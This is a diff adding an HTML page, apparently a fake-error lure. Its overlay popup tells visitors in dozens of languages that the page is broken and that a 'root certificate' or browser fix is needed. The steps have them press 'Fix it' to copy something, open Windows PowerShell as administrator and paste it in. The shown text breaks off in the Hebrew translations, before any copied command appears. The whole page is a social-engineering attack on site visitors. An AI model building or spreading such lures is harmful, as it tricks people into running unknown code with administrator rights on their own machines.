@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Golos+Text:wght@400;700&display=swap">
+  <style>
+    body {
+      font-family: 'Golos Text', sans-serif !important;
+      overflow: hidden;
+    }
+    #popupOverlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 10000;
+      background-color: rgba(0, 0, 0, 0.5);
+    }
+    #popupOverlay .popup {
+      font-family: 'Golos Text', sans-serif !important;
+      font-size: 16px;
+      color: black;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 45em;
+      height: 37em;
+      background-color: #fff;
+      border-radius: 1em;
+      box-shadow: 0 0.2rem 0.4rem rgba(0, 0, 0, 0);
+      z-index: 10001;
+      overflow: auto;
+    }
+    .topBlock {
+      width: 100%;
+      height: 4em;
+      display: flex;
+      align-items: center;
+    }
+    .iconContainer {
+      width: 10%;
+      height: 65%;
+      margin-left: 2%;
+    }
+    .textContainer {
+      font-weight: 700;
+      font-size: 1.2em;
+    }
+    .middleBlock {
+      font-family: 'Golos Text', sans-serif !important;
+      height: 20em;
+      padding: 1em 1em 2em 1em;
+      text-align: left;
+      font-size: 1.2em;
+      overflow: hidden;
+      line-height: 1.5;
+    }
+    .middleBlock p {
+      font-size: 1em;
+      line-height: 1.2em;
+    }
+    .middleBlock p:first-child {
+      margin-bottom: 1.5em;
+      font-size: 1.25em;
+      margin-top: 0.6em;
+      line-height: 1;
+    }
+    .middleBlock p:nth-child(2) {
+      margin-bottom: 2em;
+    }
+    .middleBlock ol {
+      text-align: left;
+    }
+    .bottomBlock {
+      width: 100%;
+      height: 5em;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .buttonContainer {
+      display: flex;
+      gap: 1.5em;
+      font-size: 1.25em;
+      position: relative;
+    }
+    .copyButton, .closeButton {
+      font-family: 'Golos Text', sans-serif !important;
+      font-size: 1em;
+      padding: 0.5em 1.25em;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .copyButton{
+      background-color: #000;
+      color: #fff;
+    }
+    .closeButton{
+      box-shadow: inset 0 0 2px 0px #333;
+      background-color: rgb(250 250 250);
+    }
+    .chrome .topBlock {
+      background-color: #1973E9;
+    }
+    .opera .topBlock, .firefox .topBlock {
+      background-color: #f0f0f0;
+    }
+    .opera .textContainer, .firefox .textContainer {
+      color: #000;
+    }
+    #popupOverlay ol li{
+      font-size: 0.8em;
+    }
+    .tooltip {
+      visibility: hidden;
+      width: 80px;
+      color: black;
+      text-align: center;
+      border-radius: 6px;
+      padding: 5px 0;
+      position: absolute;
+      z-index: 1;
+      bottom: 125%;
+      left: 30%;
+      margin-left: -60px;
+      opacity: 0;
+      transition: opacity 0.3s;
+      font-size: 0.6em;
+      box-shadow: inset 0 0 2px 0 #a0a0a0;
+    }
+  </style>
+  <script>
+    const translations = {
+      en: {
+        message1: "Something went wrong while displaying this webpage.",
+        message2: "To display this web page correctly, please install the root certificate. <br> Click the \"Fix it\"  button and follow the further instructions.",
+        instructions: "Follow these instructions to resolve the issue:",
+        steps: [
+          "Click the 'Fix it' button below.",
+          "Right-click on the Windows icon",
+          "Select 'Windows PowerShell (Admin)'",
+          "Right-click within the open terminal window.",
+          "Wait for the update to complete, then refresh the page."
+        ],
+        copyButton: "Fix it",
+        closeButton: "Close"
+      },
+      ru: {
+        message1: "Произошла ошибка при отображении этой веб-страницы.",
+        message2: "Во время последнего обновления версии браузера произошла ошибка, из-за которой некоторые веб-страницы работают неправильно.",
+        instructions: "Следуйте этим инструкциям, чтобы решить проблему:",
+        steps: [
+          "Нажмите кнопку 'Скопировать исправление' ниже.",
+          "Щелкните правой кнопкой мыши на значке Windows",
+          "Выберите 'Windows PowerShell (Admin)'",
+          "Щелкните правой кнопкой мыши в открытом окне терминала.",
+          "Дождитесь завершения обновления, затем обновите страницу."
+        ],
+        copyButton: "Скопировать исправление",
+        closeButton: "Закрыть"
+      },
+      es: {
+        message1: "Algo salió mal al mostrar esta página web.",
+        message2: "Hubo un error durante la última actualización de la versión del navegador, lo que provocó el mal funcionamiento de algunas páginas web.",
+        instructions: "Siga estas instrucciones para resolver el problema:",
+        steps: [
+          "Haga clic en el botón 'Copiar solución' a continuación.",
+          "Haga clic derecho en el icono de Windows",
+          "Seleccione 'Windows PowerShell (Admin)'",
+          "Haga clic derecho dentro de la ventana del terminal abierta.",
+          "Espere a que se complete la actualización, luego actualice la página."
+        ],
+        copyButton: "Copiar solución",
+        closeButton: "Cerrar"
+      },
+      fr: {
+        message1: "Une erreur est survenue lors de l'affichage de cette page web.",
+        message2: "Une erreur s'est produite lors de la dernière mise à jour de la version du navigateur, ce qui a provoqué un dysfonctionnement de certaines pages web.",
+        instructions: "Suivez ces instructions pour résoudre le problème :",
+        steps: [
+          "Cliquez sur le bouton 'Copier la solution' ci-dessous.",
+          "Cliquez avec le bouton droit sur l'icône Windows",
+          "Sélectionnez 'Windows PowerShell (Admin)'",
+          "Cliquez avec le bouton droit à l'intérieur de la fenêtre du terminal ouverte.",
+          "Attendez la fin de la mise à jour, puis actualisez la page."
+        ],
+        copyButton: "Copier la solution",
+        closeButton: "Fermer"
+      },
+      de: {
+        message1: "Beim Anzeigen dieser Webseite ist ein Fehler aufgetreten.",
+        message2: "Beim letzten Update der Browserversion ist ein Fehler aufgetreten, der dazu führt, dass einige Webseiten nicht ordnungsgemäß funktionieren.",
+        instructions: "Befolgen Sie diese Anweisungen, um das Problem zu beheben:",
+        steps: [
+          "Klicken Sie unten auf die Schaltfläche 'Lösung kopieren'.",
+          "Klicken Sie mit der rechten Maustaste auf das Windows-Symbol",
+          "Wählen Sie 'Windows PowerShell (Admin)'",
+          "Klicken Sie mit der rechten Maustaste in das offene Terminalfenster.",
+          "Warten Sie, bis das Update abgeschlossen ist, und aktualisieren Sie dann die Seite."
+        ],
+        copyButton: "Lösung kopieren",
+        closeButton: "Schließen"
+      },
+      it: {
+        message1: "Si è verificato un errore durante la visualizzazione di questa pagina web.",
+        message2: "Si è verificato un errore durante l'ultimo aggiornamento della versione del browser, causando il malfunzionamento di alcune pagine web.",
+        instructions: "Segui queste istruzioni per risolvere il problema:",
+        steps: [
+          "Fare clic sul pulsante 'Copia soluzione' di seguito.",
+          "Fare clic con il pulsante destro del mouse sull'icona di Windows",
+          "Selezionare 'Windows PowerShell (Admin)'",
+          "Fare clic con il pulsante destro del mouse all'interno della finestra del terminale aperta.",
+          "Attendere il completamento dell'aggiornamento, quindi aggiornare la pagina."
+        ],
+        copyButton: "Copia soluzione",
+        closeButton: "Chiudere"
+      },
+      pt: {
+        message1: "Algo deu errado ao exibir esta página da web.",
+        message2: "Ocorreu um erro durante a última atualização da versão do navegador, fazendo com que algumas páginas da web funcionassem mal.",
+        instructions: "Siga estas instruções para resolver o problema:",
+        steps: [
+          "Clique no botão 'Copiar correção' abaixo.",
+          "Clique com o botão direito no ícone do Windows",
+          "Selecione 'Windows PowerShell (Admin)'",
+          "Clique com o botão direito dentro da janela do terminal aberta.",
+          "Aguarde a conclusão da atualização e, em seguida, atualize a página."
+        ],
+        copyButton: "Copiar correção",
+        closeButton: "Fechar"
+      },
+      zh: {
+        message1: "显示此网页时出现问题。",
+        message2: "在最新的浏览器版本更新期间发生错误，导致某些网页无法正常工作。",
+        instructions: "按照以下说明解决此问题：",
+        steps: [
+          "点击下面的'复制修复'按钮。",
+          "右键单击Windows图标",
+          "选择'Windows PowerShell（管理员）'",
+          "在打开的终端窗口中右键单击。",
+          "等待更新完成，然后刷新页面。"
+        ],
+        copyButton: "复制修复",
+        closeButton: "关闭"
+      },
+      ja: {
+        message1: "このウェブページの表示中に問題が発生しました。",
+        message2: "最新のブラウザバージョンの更新中にエラーが発生し、一部のウェブページが正常に機能しなくなりました。",
+        instructions: "この問題を解決するには、次の手順に従ってください：",
+        steps: [
+          "以下の「修正をコピー」ボタンをクリックします。",
+          "Windowsアイコンを右クリックします",
+          "「Windows PowerShell（管理者）」を選択します",
+          "開いたターミナルウィンドウ内を右クリックします。",
+          "更新が完了するまで待ってから、ページを更新します。"
+        ],
+        copyButton: "修正をコピー",
+        closeButton: "閉じる"
+      },
+      ko: {
+        message1: "이 웹페이지를 표시하는 동안 문제가 발생했습니다.",
+        message2: "브라우저 버전의 최신 업데이트 중에 오류가 발생하여 일부 웹페이지가 오작동했습니다.",
+        instructions: "문제를 해결하려면 다음 지침을 따르십시오:",
+        steps: [
+          "'수정 복사' 버튼을 클릭합니다.",
+          "Windows 아이콘을 마우스 오른쪽 버튼으로 클릭합니다.",
+          "'Windows PowerShell (관리자)'를 선택합니다.",
+          "열린 터미널 창 안에서 마우스 오른쪽 버튼을 클릭합니다.",
+          "업데이트가 완료될 때까지 기다린 다음 페이지를 새로고칩니다."
+        ],
+        copyButton: "수정 복사",
+        closeButton: "닫기"
+      },
+      ar: {
+        message1: "حدث خطأ أثناء عرض صفحة الويب هذه.",
+        message2: "حدث خطأ أثناء التحديث الأخير لإصدار المتصفح، مما تسبب في تعطل بعض صفحات الويب.",
+        instructions: "اتبع هذه التعليمات لحل المشكلة:",
+        steps: [
+          "انقر فوق الزر 'نسخ الإصلاح' أدناه.",
+          "انقر بزر الماوس الأيمن فوق رمز Windows",
+          "حدد 'Windows PowerShell (Admin)'",
+          "انقر بزر الماوس الأيمن داخل نافذة الطرفية المفتوحة.",
+          "انتظر حتى يكتمل التحديث، ثم قم بتحديث الصفحة."
+        ],
+        copyButton: "نسخ الإصلاح",
+        closeButton: "إغلاق"
+      },
+      hi: {
+        message1: "इस वेबपेज को प्रदर्शित करते समय कुछ गलत हो गया।",
+        message2: "ब्राउज़र संस्करण के नवीनतम अपडेट के दौरान एक त्रुटि हुई, जिसके कारण कुछ वेब पेज खराब हो गए।",
+        instructions: "समस्या को हल करने के लिए इन निर्देशों का पालन करें:",
+        steps: [
+          "नीचे 'कॉपी फिक्स' बटन पर क्लिक करें।",
+          "Windows आइकन पर राइट-क्लिक करें",
+          "चुनें 'Windows PowerShell (Admin)'",
+          "खुली टर्मिनल विंडो के भीतर राइट-क्लिक करें।",
+          "अपडेट पूरा होने तक प्रतीक्षा करें, फिर पेज को रीफ्रेश करें।"
+        ],
+        copyButton: "कॉपी फिक्स",
+        closeButton: "बंद करें"
+      },
+      bn: {
+        message1: "এই ওয়েবপেজ প্রদর্শনের সময় কিছু ভুল হয়েছে।",
+        message2: "ব্রাউজারের সর্বশেষ আপডেটের সময় একটি ত্রুটি ঘটেছিল, যার ফলে কিছু ওয়েব পেজ ত্রুটিপূর্ণ হয়েছে।",
+        instructions: "সমস্যা সমাধানের জন্য এই নির্দেশাবলী অনুসরণ করুন:",
+        steps: [
+          "নীচের 'কপি ফিক্স' বোতামে ক্লিক করুন।",
+          "Windows আইকনে ডান-ক্লিক করুন",
+          "নির্বাচন করুন 'Windows PowerShell (Admin)'",
+          "খোলা টার্মিনাল উইন্ডোর ভিতরে ডান-ক্লিক করুন।",
+          "আপডেট সম্পূর্ণ হওয়ার জন্য অপেক্ষা করুন, তারপর পৃষ্ঠাটি রিফ্রেশ করুন।"
+        ],
+        copyButton: "কপি ফিক্স",
+        closeButton: "বন্ধ করুন"
+      },
+      ur: {
+        message1: "اس ویب پیج کو ظاہر کرتے وقت کچھ غلط ہو گیا۔",
+        message2: "براؤزر ورژن کی تازہ ترین اپ ڈیٹ کے دوران ایک خرابی پیش آگئی، جس کی وجہ سے کچھ ویب صفحات خراب ہو گئے۔",
+        instructions: "مسئلہ حل کرنے کے لیے ان ہدایات پر عمل کریں:",
+        steps: [
+          "نیچے 'کاپی فکس' بٹن پر کلک کریں۔",
+          "Windows آئیکن پر دائیں کلک کریں",
+          "منتخب کریں 'Windows PowerShell (Admin)'",
+          "کھلی ٹرمینل ونڈو کے اندر دائیں کلک کریں۔",
+          "اپ ڈیٹ مکمل ہونے کا انتظار کریں، پھر صفحہ کو ریفریش کریں۔"
+        ],
+        copyButton: "کاپی فکس",
+        closeButton: "بند کریں"
+      },
+      tr: {
+        message1: "Bu web sayfasını görüntülerken bir sorun oluştu.",
+        message2: "Tarayıcı sürümünün son güncellemesi sırasında bir hata oluştu ve bazı web sayfaları düzgün çalışmıyor.",
+        instructions: "Sorunu çözmek için bu talimatları izleyin:",
+        steps: [
+          "Aşağıdaki 'Düzeltmeyi kopyala' düğmesine tıklayın.",
+          "Windows simgesine sağ tıklayın",
+          "Seçin 'Windows PowerShell (Admin)'",
+          "Açık terminal penceresinin içinde sağ tıklayın.",
+          "Güncellemenin tamamlanmasını bekleyin, ardından sayfayı yenileyin."
+        ],
+        copyButton: "Düzeltmeyi kopyala",
+        closeButton: "Kapat"
+      },
+      fa: {
+        message1: "در هنگام نمایش این صفحه وب مشکلی پیش آمد.",
+        message2: "در طول به‌روزرسانی آخرین نسخه مرورگر، خطایی رخ داد که باعث شد برخی از صفحات وب خراب شوند.",
+        instructions: "برای حل مشکل، این دستورالعمل‌ها را دنبال کنید:",
+        steps: [
+          "روی دکمه 'کپی کردن راه‌حل' در زیر کلیک کنید.",
+          "روی نماد Windows راست‌کلیک کنید",
+          "انتخاب کنید 'Windows PowerShell (Admin)'",
+          "در داخل پنجره ترمینال باز راست‌کلیک کنید.",
+          "منتظر بمانید تا به‌روزرسانی کامل شود، سپس صفحه را تازه کنید."
+        ],
+        copyButton: "کپی کردن راه‌حل",
+        closeButton: "بستن"
+      },
+      vi: {
+        message1: "Đã xảy ra sự cố khi hiển thị trang web này.",
+        message2: "Đã xảy ra lỗi trong quá trình cập nhật phiên bản trình duyệt mới nhất, khiến một số trang web bị lỗi.",
+        instructions: "Làm theo các hướng dẫn sau để giải quyết vấn đề:",
+        steps: [
+          "Nhấp vào nút 'Sao chép sửa lỗi' bên dưới.",
+          "Nhấp chuột phải vào biểu tượng Windows",
+          "Chọn 'Windows PowerShell (Admin)'",
+          "Nhấp chuột phải vào bên trong cửa sổ terminal mở.",
+          "Chờ cập nhật hoàn tất, sau đó làm mới trang."
+        ],
+        copyButton: "Sao chép sửa lỗi",
+        closeButton: "Đóng"
+      },
+      th: {
+        message1: "เกิดข้อผิดพลาดขณะแสดงหน้าเว็บนี้",
+        message2: "เกิดข้อผิดพลาดระหว่างการอัปเดตเวอร์ชันของเบราว์เซอร์ล่าสุด ทำให้บางหน้าเว็บทำงานผิดปกติ",
+        instructions: "ทำตามคำแนะนำเหล่านี้เพื่อแก้ไขปัญหา:",
+        steps: [
+          "คลิกปุ่ม 'คัดลอกการแก้ไข' ด้านล่าง",
+          "คลิกขวาที่ไอคอน Windows",
+          "เลือก 'Windows PowerShell (Admin)'",
+          "คลิกขวาภายในหน้าต่างเทอร์มินัลที่เปิดอยู่",
+          "รอการอัปเดตให้เสร็จสิ้น จากนั้นรีเฟรชหน้า"
+        ],
+        copyButton: "คัดลอกการแก้ไข",
+        closeButton: "ปิด"
+      },
+      id: {
+        message1: "Terjadi kesalahan saat menampilkan halaman web ini.",
+        message2: "Terjadi kesalahan selama pembaruan versi browser terbaru, menyebabkan beberapa halaman web tidak berfungsi.",
+        instructions: "Ikuti petunjuk ini untuk menyelesaikan masalah:",
+        steps: [
+          "Klik tombol 'Salin perbaikan' di bawah ini.",
+          "Klik kanan pada ikon Windows",
+          "Pilih 'Windows PowerShell (Admin)'",
+          "Klik kanan di dalam jendela terminal yang terbuka.",
+          "Tunggu pembaruan selesai, lalu segarkan halaman."
+        ],
+        copyButton: "Salin perbaikan",
+        closeButton: "Tutup"
+      },
+      ms: {
+        message1: "Terdapat masalah semasa memaparkan laman web ini.",
+        message2: "Terdapat ralat semasa kemas kini versi pelayar terbaru, menyebabkan beberapa laman web tidak berfungsi.",
+        instructions: "Ikuti arahan ini untuk menyelesaikan masalah:",
+        steps: [
+          "Klik butang 'Salin pembaikan' di bawah.",
+          "Klik kanan pada ikon Windows",
+          "Pilih 'Windows PowerShell (Admin)'",
+          "Klik kanan dalam tetingkap terminal yang terbuka.",
+          "Tunggu sehingga kemas kini selesai, kemudian segarkan halaman."
+        ],
+        copyButton: "Salin pembaikan",
+        closeButton: "Tutup"
+      },
+      pl: {
+        message1: "Wystąpił błąd podczas wyświetlania tej strony internetowej.",
+        message2: "Podczas ostatniej aktualizacji wersji przeglądarki wystąpił błąd, który spowodował nieprawidłowe działanie niektórych stron internetowych.",
+        instructions: "Postępuj zgodnie z tymi instrukcjami, aby rozwiązać problem:",
+        steps: [
+          "Kliknij poniższy przycisk 'Kopiuj naprawę'.",
+          "Kliknij prawym przyciskiem myszy ikonę Windows",
+          "Wybierz 'Windows PowerShell (Admin)'",
+          "Kliknij prawym przyciskiem myszy wewnątrz otwartego okna terminala.",
+          "Poczekaj na zakończenie aktualizacji, a następnie odśwież stronę."
+        ],
+        copyButton: "Kopiuj naprawę",
+        closeButton: "Zamknij"
+      },
+      nl: {
+        message1: "Er is iets misgegaan bij het weergeven van deze webpagina.",
+        message2: "Er is een fout opgetreden tijdens de laatste update van de browserversie, waardoor sommige webpagina's niet goed functioneren.",
+        instructions: "Volg deze instructies om het probleem op te lossen:",
+        steps: [
+          "Klik op de knop 'Fix kopiëren' hieronder.",
+          "Klik met de rechtermuisknop op het Windows-pictogram",
+          "Selecteer 'Windows PowerShell (Admin)'",
+          "Klik met de rechtermuisknop in het geopende terminalvenster.",
+          "Wacht tot de update is voltooid en vernieuw vervolgens de pagina."
+        ],
+        copyButton: "Fix kopiëren",
+        closeButton: "Sluiten"
+      },
+      sv: {
+        message1: "Något gick fel vid visning av den här webbsidan.",
+        message2: "Ett fel inträffade under den senaste uppdateringen av webbläsarversionen, vilket orsakade att vissa webbsidor fungerar dåligt.",
+        instructions: "Följ dessa instruktioner för att lösa problemet:",
+        steps: [
+          "Klicka på knappen 'Kopiera fix' nedan.",
+          "Högerklicka på Windows-ikonen",
+          "Välj 'Windows PowerShell (Admin)'",
+          "Högerklicka i det öppna terminalfönstret.",
+          "Vänta tills uppdateringen är klar och uppdatera sedan sidan."
+        ],
+        copyButton: "Kopiera fix",
+        closeButton: "Stäng"
+      },
+      da: {
+        message1: "Der opstod en fejl under visningen af denne webside.",
+        message2: "Der opstod en fejl under den seneste opdatering af browserversionen, hvilket forårsagede, at nogle websider ikke fungerer korrekt.",
+        instructions: "Følg disse instruktioner for at løse problemet:",
+        steps: [
+          "Klik på knappen 'Kopier fix' nedenfor.",
+          "Højreklik på Windows-ikonet",
+          "Vælg 'Windows PowerShell (Admin)'",
+          "Højreklik inden i det åbne terminalvindue.",
+          "Vent, indtil opdateringen er fuldført, og opdater derefter siden."
+        ],
+        copyButton: "Kopier fix",
+        closeButton: "Luk"
+      },
+      no: {
+        message1: "Noe gikk galt under visningen av denne nettsiden.",
+        message2: "Det oppstod en feil under den siste oppdateringen av nettleserversjonen, noe som førte til at noen nettsider ikke fungerer.",
+        instructions: "Følg disse instruksjonene for å løse problemet:",
+        steps: [
+          "Klikk på 'Kopier fiks' knappen nedenfor.",
+          "Høyreklikk på Windows-ikonet",
+          "Velg 'Windows PowerShell (Admin)'",
+          "Høyreklikk inne i det åpne terminalvinduet.",
+          "Vent til oppdateringen er fullført, og oppdater deretter siden."
+        ],
+        copyButton: "Kopier fiks",
+        closeButton: "Lukk"
+      },
+      fi: {
+        message1: "Tämän verkkosivun näyttämisessä tapahtui virhe.",
+        message2: "Selaimen version viimeisimmän päivityksen aikana tapahtui virhe, joka aiheutti joidenkin verkkosivujen toimimattomuuden.",
+        instructions: "Noudata näitä ohjeita ongelman ratkaisemiseksi:",
+        steps: [
+          "Napsauta alla olevaa 'Kopioi korjaus' -painiketta.",
+          "Napsauta hiiren kakkospainikkeella Windows-kuvaketta",
+          "Valitse 'Windows PowerShell (Admin)'",
+          "Napsauta hiiren kakkospainikkeella avatussa pääteikkunassa.",
+          "Odota, että päivitys on valmis, ja päivitä sitten sivu."
+        ],
+        copyButton: "Kopioi korjaus",
+        closeButton: "Sulje"
+      },
+      cs: {
+        message1: "Při zobrazování této webové stránky došlo k chybě.",
+        message2: "Při poslední aktualizaci verze prohlížeče došlo k chybě, která způsobila nefunkčnost některých webových stránek.",
+        instructions: "Postupujte podle těchto pokynů k vyřešení problému:",
+        steps: [
+          "Klikněte na níže uvedené tlačítko 'Kopírovat opravu'.",
+          "Klikněte pravým tlačítkem myši na ikonu Windows",
+          "Vyberte 'Windows PowerShell (Admin)'",
+          "Klikněte pravým tlačítkem myši do otevřeného okna terminálu.",
+          "Počkejte, až se aktualizace dokončí, a poté stránku aktualizujte."
+        ],
+        copyButton: "Kopírovat opravu",
+        closeButton: "Zavřít"
+      },
+      el: {
+        message1: "Κάτι πήγε στραβά κατά την προβολή αυτής της ιστοσελίδας.",
+        message2: "Παρουσιάστηκε σφάλμα κατά την τελευταία ενημέρωση της έκδοσης του προγράμματος περιήγησης, προκαλώντας δυσλειτουργία ορισμένων ιστοσελίδων.",
+        instructions: "Ακολουθήστε αυτές τις οδηγίες για να επιλύσετε το πρόβλημα:",
+        steps: [
+          "Κάντε κλικ στο κουμπί 'Αντιγραφή επιδιόρθωσης' παρακάτω.",
+          "Κάντε δεξί κλικ στο εικονίδιο των Windows",
+          "Επιλέξτε 'Windows PowerShell (Διαχειριστής)'",
+          "Κάντε δεξί κλικ μέσα στο ανοιχτό παράθυρο τερματικού.",
+          "Περιμένετε να ολοκληρωθεί η ενημέρωση και στη συνέχεια ανανεώστε τη σελίδα."
+        ],
+        copyButton: "Αντιγραφή επιδιόρθωσης",
+        closeButton: "Κλείσιμο"
+      },
+      hu: {
+        message1: "Hiba történt a weboldal megjelenítése közben.",
+        message2: "A böngésző verziójának legutóbbi frissítése során hiba történt, ami miatt néhány weboldal nem működik megfelelően.",
+        instructions: "Kövesse ezeket az utasításokat a probléma megoldásához:",
+        steps: [
+          "Kattintson az alábbi 'Javítás másolása' gombra.",
+          "Kattintson jobb gombbal a Windows ikonra",
+          "Válassza a 'Windows PowerShell (Admin)' lehetőséget",
+          "Kattintson jobb gombbal a megnyitott terminálablakba.",
+          "Várjon, amíg a frissítés befejeződik, majd frissítse az oldalt."
+        ],
+        copyButton: "Javítás másolása",
+        closeButton: "Bezárás"
+      },
+      ro: {
+        message1: "A apărut o problemă la afișarea acestei pagini web.",
+        message2: "A apărut o eroare în timpul ultimei actualizări a versiunii browserului, ceea ce a cauzat funcționarea defectuoasă a unor pagini web.",
+        instructions: "Urmați aceste instrucțiuni pentru a rezolva problema:",
+        steps: [
+          "Faceți clic pe butonul 'Copiați remedierea' de mai jos.",
+          "Faceți clic dreapta pe pictograma Windows",
+          "Selectați 'Windows PowerShell (Admin)'",
+          "Faceți clic dreapta în fereastra terminalului deschis.",
+          "Așteptați finalizarea actualizării, apoi reîmprospătați pagina."
+        ],
+        copyButton: "Copiați remedierea",
+        closeButton: "Închideți"
+      },
+      sk: {
+        message1: "Pri zobrazovaní tejto webovej stránky sa vyskytla chyba.",
+        message2: "Počas poslednej aktualizácie verzie prehliadača došlo k chybe, ktorá spôsobila nefunkčnosť niektorých webových stránok.",
+        instructions: "Postupujte podľa týchto pokynov na vyriešenie problému:",
+        steps: [
+          "Kliknite na tlačidlo 'Kopírovať opravu' nižšie.",
+          "Kliknite pravým tlačidlom myši na ikonu Windows",
+          "Vyberte 'Windows PowerShell (Admin)'",
+          "Kliknite pravým tlačidlom myši do otvoreného okna terminálu.",
+          "Počkajte, kým sa aktualizácia dokončí, a potom stránku aktualizujte."
+        ],
+        copyButton: "Kopírovať opravu",
+        closeButton: "Zavrieť"
+      },
+      bg: {
+        message1: "Възникна грешка при показването на тази уеб страница.",
+        message2: "Възникна грешка по време на последната актуализация на версията на браузъра, което доведе до неправилно функциониране на някои уеб страници.",
+        instructions: "Следвайте тези инструкции, за да решите проблема:",
+        steps: [
+          "Щракнете върху бутона 'Копиране на корекцията' по-долу.",
+          "Щракнете с десния бутон върху иконата на Windows",
+          "Изберете 'Windows PowerShell (Admin)'",
+          "Щракнете с десния бутон вътре в отворения терминален прозорец.",
+          "Изчакайте да завърши актуализацията, след което обновете страницата."
+        ],
+        copyButton: "Копиране на корекцията",
+        closeButton: "Затвори"
+      },
+      hr: {
+        message1: "Došlo je do pogreške prilikom prikazivanja ove web stranice.",
+        message2: "Došlo je do pogreške tijekom najnovijeg ažuriranja verzije preglednika, uzrokujući neispravan rad nekih web stranica.",
+        instructions: "Slijedite ove upute za rješavanje problema:",
+        steps: [
+          "Kliknite na gumb 'Kopiraj popravak' u nastavku.",
+          "Desnom tipkom miša kliknite ikonu Windows",
+          "Odaberite 'Windows PowerShell (Admin)'",
+          "Desnom tipkom miša kliknite unutar otvorenog terminalskog prozora.",
+          "Pričekajte da se ažuriranje dovrši, a zatim osvježite stranicu."
+        ],
+        copyButton: "Kopiraj popravak",
+        closeButton: "Zatvori"
+      },
+      lt: {
+        message1: "Rodant šį tinklalapį įvyko klaida.",
+        message2: "Naujausio naršyklės versijos atnaujinimo metu įvyko klaida, dėl kurios kai kurie tinklalapiai veikė netinkamai.",
+        instructions: "Vadovaukitės šiais nurodymais, kad išspręstumėte problemą:",
+        steps: [
+          "Spustelėkite toliau esantį mygtuką 'Kopijuoti taisymą'.",
+          "Dešiniuoju pelės mygtuku spustelėkite Windows piktogramą",
+          "Pasirinkite 'Windows PowerShell (Admin)'",
+          "Dešiniuoju pelės mygtuku spustelėkite atidarytame terminalo lange.",
+          "Palaukite, kol atnaujinimas bus baigtas, tada atnaujinkite puslapį."
+        ],
+        copyButton: "Kopijuoti taisymą",
+        closeButton: "Uždaryti"
+      },
+      lv: {
+        message1: "Parādot šo tīmekļa lapu, radās kļūda.",
+        message2: "Pēdējās pārlūkprogrammas versijas atjaunināšanas laikā radās kļūda, kas izraisīja dažu tīmekļa lapu darbības traucējumus.",
+        instructions: "Lai atrisinātu problēmu, izpildiet šos norādījumus:",
+        steps: [
+          "Noklikšķiniet uz zemāk esošās pogas 'Kopēt labojumu'.",
+          "Ar peles labo pogu noklikšķiniet uz Windows ikonas",
+          "Atlasiet 'Windows PowerShell (Admin)'",
+          "Ar peles labo pogu noklikšķiniet atvērtajā termināļa logā.",
+          "Pagaidiet, līdz atjaunināšana būs pabeigta, un pēc tam atsvaidziniet lapu."
+        ],
+        copyButton: "Kopēt labojumu",
+        closeButton: "Aizvērt"
+      },
+      et: {
+        message1: "Selle veebilehe kuvamisel ilmnes probleem.",
+        message2: "Viimase brauseri versiooni värskenduse ajal ilmnes viga, mis põhjustas mõnede veebilehtede tõrke.",
+        instructions: "Järgige nende juhistega probleemi lahendamiseks:",
+        steps: [
+          "Klõpsake allolevat nuppu 'Kopeeri parandus'.",
+          "Paremklõpsake Windowsi ikoonil",
+          "Valige 'Windows PowerShell (Admin)'",
+          "Paremklõpsake avatud terminaliaknas.",
+          "Oodake, kuni värskendus on lõpule viidud, ja seejärel värskendage lehte."
+        ],
+        copyButton: "Kopeeri parandus",
+        closeButton: "Sulge"
+      },
+      sl: {
+        message1: "Pri prikazovanju te spletne strani je prišlo do napake.",
+        message2: "Med zadnjo posodobitvijo različice brskalnika je prišlo do napake, zaradi katere nekatere spletne strani ne delujejo pravilno.",
+        instructions: "Sledite tem navodilom za odpravo težave:",
+        steps: [
+          "Kliknite spodnji gumb 'Kopiraj popravek'.",
+          "Z desno miškino tipko kliknite ikono Windows",
+          "Izberite 'Windows PowerShell (Admin)'",
+          "Z desno miškino tipko kliknite v odprtem terminalskem oknu.",
+          "Počakajte, da se posodobitev konča, nato pa osvežite stran."
+        ],
+        copyButton: "Kopiraj popravek",
+        closeButton: "Zapri"
+      },
+      sr: {
+        message1: "Došlo je do greške prilikom prikazivanja ove veb stranice.",
+        message2: "Došlo je do greške tokom poslednjeg ažuriranja verzije pregledača, što je izazvalo kvar nekih veb stranica.",
+        instructions: "Pratite ova uputstva za rešavanje problema:",
+        steps: [
+          "Kliknite na dugme 'Kopiraj popravku' ispod.",
+          "Kliknite desnim tasterom miša na ikonu Windows",
+          "Izaberite 'Windows PowerShell (Admin)'",
+          "Kliknite desnim tasterom miša unutar otvorenog terminalskog prozora.",
+          "Sačekajte da se ažuriranje završi, a zatim osvežite stranicu."
+        ],
+        copyButton: "Kopiraj popravku",
+        closeButton: "Zatvori"
+      },
+      mk: {
+        message1: "Се случи грешка при прикажување на оваа веб-страница.",
+        message2: "Се случи грешка за време на најновото ажурирање на верзијата на прелистувачот, што предизвика неправилно функционирање на некои веб-страници.",
+        instructions: "Следете ги овие инструкции за да го решите проблемот:",
+        steps: [
+          "Кликнете на копчето 'Копирај поправка' подолу.",
+          "Кликнете со десното копче на иконата Windows",
+          "Изберете 'Windows PowerShell (Admin)'",
+          "Кликнете со десното копче во отворениот прозорец на терминалот.",
+          "Почекајте да се заврши ажурирањето, а потоа освежете ја страницата."
+        ],
+        copyButton: "Копирај поправка",
+        closeButton: "Затвори"
+      },
+      az: {
+        message1: "Bu veb səhifəsini göstərərkən bir problem meydana gəldi.",
+        message2: "Brauzer versiyasının son yeniləməsi zamanı bir səhv baş verdi, bu da bəzi veb səhifələrin işləməməsinə səbəb oldu.",
+        instructions: "Problemi həll etmək üçün bu təlimatlara əməl edin:",
+        steps: [
+          "Aşağıdakı 'Təmir nüsxəsini çıxarın' düyməsini basın.",
+          "Windows nişanına sağ vurun",
+          "Seçin 'Windows PowerShell (Admin)'",
+          "Açıq terminal pəncərəsinin içində sağ vurun.",
+          "Yeniləmə tamamlanana qədər gözləyin, sonra səhifəni yeniləyin."
+        ],
+        copyButton: "Təmir nüsxəsini çıxarın",
+        closeButton: "Bağlayın"
+      },
+      he: {
+        message1: "אירעה שגיאה במהלך הצגת דף האינטרנט הזה.",
